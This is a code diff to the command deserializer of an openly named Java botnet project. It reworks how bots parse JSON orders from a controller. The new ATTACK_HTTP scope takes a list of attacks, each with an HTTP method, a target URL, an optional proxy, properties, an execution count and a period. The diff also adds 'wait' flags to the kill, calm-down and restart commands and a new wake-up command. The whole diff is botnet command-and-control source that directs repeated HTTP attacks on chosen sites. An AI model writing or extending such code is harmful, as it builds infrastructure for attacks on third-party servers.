@@ -26,22 +26,24 @@
 
 package com.acmutv.botnet.core.control.command.serial;
 
+import com.acmutv.botnet.core.attack.HttpAttack;
 import com.acmutv.botnet.tool.net.HttpMethod;
 import com.acmutv.botnet.tool.net.HttpProxy;
 import com.acmutv.botnet.tool.string.TemplateEngine;
 import com.acmutv.botnet.core.control.command.BotCommand;
 import com.acmutv.botnet.core.control.command.CommandScope;
-import com.acmutv.botnet.core.target.HttpTarget;
 import com.acmutv.botnet.tool.time.Interval;
 import com.fasterxml.jackson.core.JsonParser;
+import com.fasterxml.jackson.core.TreeNode;
+import com.fasterxml.jackson.core.type.TypeReference;
 import com.fasterxml.jackson.databind.DeserializationContext;
 import com.fasterxml.jackson.databind.JsonNode;
+import com.fasterxml.jackson.databind.ObjectMapper;
 import com.fasterxml.jackson.databind.deser.std.StdDeserializer;
 
 import java.io.IOException;
 import java.net.URL;
 import java.util.*;
-import java.util.concurrent.TimeUnit;
 
 /**
  * This class realizes the JSON deserializer for {@link BotCommand}.
@@ -97,14 +99,12 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
       switch (cmd.getScope()) {
 
         case ATTACK_HTTP:
-          if (!node.has("method") || !node.has("targets")) {
-            throw new IOException("Cannot read parameters [methods,targets] for scope [ATTACK_HTTP] (missing)");
+          if (!node.hasNonNull("attacks")) {
+            throw new IOException("Cannot read parameters [attacks] for scope [ATTACK_HTTP] (missing)");
           }
-          final HttpMethod httpMethod = HttpMethod.from(node.get("method").asText());
-          final List<HttpTarget> httpTargets = parseTargets(node.get("targets"));
+          final List<HttpAttack> httpAttacks = deserializeHttpAttacks(node.get("attacks"));
 
-          cmd.getParams().put("method", httpMethod);
-          cmd.getParams().put("targets", httpTargets);
+          cmd.getParams().put("attacks", httpAttacks);
 
           if (node.hasNonNull("delay")) {
             final Interval attackHttpDelay = Interval.valueOf(node.get("delay").asText());
@@ -114,6 +114,11 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
           break;
 
         case CALMDOWN:
+          if (node.hasNonNull("wait")) {
+            final boolean calmdownWait = node.get("wait").asBoolean();
+            cmd.getParams().put("wait", calmdownWait);
+          }
+
           if (node.hasNonNull("delay")) {
             final Interval calmdownDelay = Interval.valueOf(node.get("delay").asText());
             cmd.getParams().put("delay", calmdownDelay);
@@ -122,9 +127,9 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
           break;
 
         case KILL:
-          if (node.hasNonNull("timeout")) {
-            final Interval killTimeout = Interval.valueOf(node.get("timeout").asText());
-            cmd.getParams().put("timeout", killTimeout);
+          if (node.hasNonNull("wait")) {
+            final boolean killWait = node.get("wait").asBoolean();
+            cmd.getParams().put("wait", killWait);
           }
 
           if (node.hasNonNull("delay")) {
@@ -139,6 +144,11 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
             throw new IOException("Cannot read parameter [resource] for scope [RESTART] (missing)");
           }
           final String resource = TemplateEngine.getInstance().replace(node.get("resource").asText());
+
+          if (node.hasNonNull("wait")) {
+            final boolean restartWait = node.get("wait").asBoolean();
+            cmd.getParams().put("wait", restartWait);
+          }
 
           cmd.getParams().put("resource", resource);
 
@@ -158,17 +168,24 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
           break;
 
         case SLEEP:
-          if (!node.has("timeout")) {
-            throw new IOException("Cannot read parameter [timeout] for scope [SLEEP] (missing)");
+          if (node.hasNonNull("timeout")) {
+            final Interval sleepTimeout = Interval.valueOf(node.get("timeout").asText());
+            cmd.getParams().put("timeout", sleepTimeout);
           }
-          final Interval sleepTimeout = Interval.valueOf(node.get("timeout").asText());
-
-          cmd.getParams().put("timeout", sleepTimeout);
 
           if (node.hasNonNull("delay")) {
             final Interval sleepDelay = Interval.valueOf(node.get("delay").asText());
             cmd.getParams().put("delay", sleepDelay);
           }
+
+          break;
+
+        case WAKEUP:
+          if (node.hasNonNull("delay")) {
+            final Interval wakeupDelay = Interval.valueOf(node.get("delay").asText());
+            cmd.getParams().put("delay", wakeupDelay);
+          }
+
           break;
 
         default:
@@ -180,30 +197,47 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
   }
 
   /**
-   * Parses a list of {@link HttpTarget} from a JSON node.
+   * Deserializes a list of {@link HttpAttack} from a JSON node.
    * @param node the JSON node to parse.
-   * @return the parsed list of {@link HttpTarget}.
+   * @return the deserialized list of {@link HttpAttack}.
    */
-  private static List<HttpTarget> parseTargets(JsonNode node) throws IOException {
-    List<HttpTarget> targets = new ArrayList<>();
+  private static List<HttpAttack> deserializeHttpAttacks(JsonNode node) throws IOException {
+    List<HttpAttack> attacks = new ArrayList<>();
     Iterator<JsonNode> iter = node.elements();
     while (iter.hasNext()) {
       JsonNode n = iter.next();
-      if (!n.hasNonNull("url") ||
-          !n.hasNonNull("period") ||
-          !n.hasNonNull("maxAttempts")) {
-        continue;
+      if (!n.hasNonNull("method") ||
+          !n.hasNonNull("target")) {
+        throw new IOException("Cannot deserialize attacks. Params [method, target] missing or null");
       }
-      final String url = n.get("url").asText();
-      final Interval period = Interval.valueOf(n.get("period").asText());
-      final long maxAttempt = n.get("maxAttempts").asLong();
-      HttpProxy proxy = null;
+      final HttpMethod method = HttpMethod.valueOf(n.get("method").asText());
+      final String target = n.get("target").asText();
+
+      HttpAttack attack = new HttpAttack(method, new URL(target));
+
       if (n.hasNonNull("proxy")) {
-        proxy = HttpProxy.valueOf(n.get("proxy").asText());
+        final HttpProxy proxy = HttpProxy.valueOf(n.get("proxy").asText());
+        attack.setProxy(proxy);
       }
-      HttpTarget target = new HttpTarget(new URL(url), period, maxAttempt, proxy);
-      targets.add(target);
+
+      if (n.hasNonNull("properties")) {
+        Map<String,String> properties =
+            new ObjectMapper().readValue(n.get("properties").traverse(), new TypeReference<Map<String, String>>(){});
+        attack.setProperties(properties);
+      }
+
+      if (n.hasNonNull("executions")) {
+        final int executions = n.get("executions").asInt();
+        attack.setExecutions(executions);
+      }
+
+      if (n.hasNonNull("period")) {
+        final Interval period = Interval.valueOf(n.get("period").asText());
+        attack.setPeriod(period);
+      }
+
+      attacks.add(attack);
     }
-    return targets;
+    return attacks;
   }
 }
